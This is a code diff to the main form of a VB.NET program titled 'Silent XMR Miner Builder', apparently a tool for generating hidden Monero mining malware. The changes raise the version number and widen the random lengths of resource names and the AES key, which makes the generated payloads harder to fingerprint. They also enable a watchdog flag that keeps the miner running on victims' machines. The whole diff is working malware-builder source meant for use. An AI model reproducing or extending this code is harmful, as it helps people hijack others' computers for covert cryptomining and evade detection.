@@ -20,7 +20,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            MephForm1.Text = "Silent XMR Miner Builder 1.0.1"
+            MephForm1.Text = "Silent XMR Miner Builder 1.0.2"
         Catch ex As Exception
         End Try
 
@@ -43,14 +43,14 @@ Public Class Form1
     End Sub
 
     Public OutputPayload
-    Public Resources_dll = Randomi(rand.Next(5, 10))
-    Public Resources_xmr = Randomi(rand.Next(5, 10))
-    Public Resources_xmrig = Randomi(rand.Next(5, 10))
-    Public Resources_libs = Randomi(rand.Next(5, 10))
-    Public Resources_watchdog = Randomi(rand.Next(5, 10))
-    Public Resources_winring = Randomi(rand.Next(5, 10))
-    Public Resources_Parent = Randomi(rand.Next(5, 10))
-    Public AESKEY As String = Randomi(rand.Next(5, 10))
+    Public Resources_dll = Randomi(rand.Next(5, 40))
+    Public Resources_xmr = Randomi(rand.Next(5, 40))
+    Public Resources_xmrig = Randomi(rand.Next(5, 40))
+    Public Resources_libs = Randomi(rand.Next(5, 40))
+    Public Resources_watchdog = Randomi(rand.Next(5, 40))
+    Public Resources_winring = Randomi(rand.Next(5, 40))
+    Public Resources_Parent = Randomi(rand.Next(5, 40))
+    Public AESKEY As String = Randomi(rand.Next(5, 40))
 
     Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
         Try
@@ -136,6 +136,8 @@ Public Class Form1
                 If toggleWatchdog.Checked Then
 
                     txtLog.Text = txtLog.Text + ("Compiling Watchdog..." + vbNewLine)
+                    minerbuilder.Replace("#Const WD = False", "#Const WD = True")
+
                     Dim WatchdogSource = My.Resources.Watchdog
                     Dim watchdogbuilder As New StringBuilder(WatchdogSource)
 
@@ -432,4 +434,5 @@ Public Class Form1
             txtIdleWait.Enabled = False
         End If
     End Sub
+
 End Class
